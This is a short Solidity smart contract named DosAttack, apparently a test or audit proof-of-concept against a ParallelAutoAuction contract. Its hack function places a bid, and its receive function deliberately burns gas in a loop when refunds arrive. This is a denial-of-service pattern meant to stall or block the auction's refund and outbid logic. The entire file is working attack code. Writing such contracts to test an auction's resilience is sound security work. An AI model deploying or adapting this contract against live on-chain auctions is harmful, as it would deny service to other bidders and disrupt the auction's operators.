// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import "../ParallelAutoAuction.sol";

contract DosAttack {
    
    ParallelAutoAuction auction;
    uint24 id;
    uint256 public i;

    constructor(address _auction) {
        auction = ParallelAutoAuction(_auction);
    }
    
    function hack(uint24 _id) public payable {
        id = _id;
        auction.createBid{value: msg.value}(id);
    }

    receive() external payable { 
        while (i < 158) i++;
    }
    
}

